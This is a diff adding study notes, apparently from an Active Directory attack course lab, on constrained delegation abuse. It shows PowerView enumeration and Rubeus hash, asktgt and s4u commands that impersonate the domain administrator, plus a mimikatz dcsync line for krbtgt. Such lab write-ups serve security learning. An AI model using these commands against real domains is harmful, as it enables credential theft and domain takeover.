@@ -104,6 +104,57 @@ mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
 Constrained delegation is configured on the computer or user object. It is set through the msdsallowedtodelegateto
 property by specifying the SPNs the current object is allowed constrained delegation against.
 
+We can use powerview again to query **TrustedToAuth** flag, which will enumerate constrained delegation:
 ```
+PS C:\tools> Get-DomainUser -TrustedToAuth
+
+samaccountname : IISSvc
+
+msds-allowedtodelegateto : {MSSQLSvc/CDC01.prod.corp1.com:SQLEXPRESS,
+MSSQLSvc/cdc01.prod.corp1.com:1433}
+
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD,
+TRUSTED_TO_AUTH_FOR_DELEGATION
 ```
-p625
+msds-allowedtodelegateto property contains the SPN of the MS SQL server
+on CDC01. This tells us that constrained delegation is only allowed to that SQL server
+
+TRUSTED_TO_AUTH_FOR_DELEGATION indicate whether constrained delegation can be used if the
+authentication between the user and the service uses a different authentication mechanism like
+NTLM
+
+in this case,IISSvc account can request a service ticket for the services listed in the
+msds-allowedtodelegateto field as any user in the domain.
+
+Note, we do not need to execute in the context of the IISSvc account in order to exploit the
+account. We only need the password hash.
+
+- 1.Create hash from iiSSvc account 
+```
+PS C:\Tools> .\Rubeus.exe hash /password:lab
+...
+[*] Action: Calculate Password Hash(es)
+[*] Input password : lab
+[*] rc4_hmac : 2892D26CDF84D7A70E2EB3B9F05C425E
+```
+
+- 2.generate a TGT for IISSvc
+```
+PS C:\Tools> .\Rubeus.exe asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
+```
+
+- 3.pass the ticket with base 64 encoded ticket,supply the SPN of the service (/msdsspn),
+```
+PS C:\Tools> .\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt
+```
+
+#### Resource-Based Constrained Delegation
+
+RBCD works by essentially turning the delegation settings around. The msDSAllowedToActOnBehalfOfOtherIdentity
+property  controls delegation from the backend service.
+To configure RBCD, the SID of the frontend service is written to the new property of the backend
+service. One important requirement is that the frontend service must have an SPN set in the domain. This means that
+any attack against RBCD needs to happen from a computer account or a service account with a
+SPN.
+
+page 632
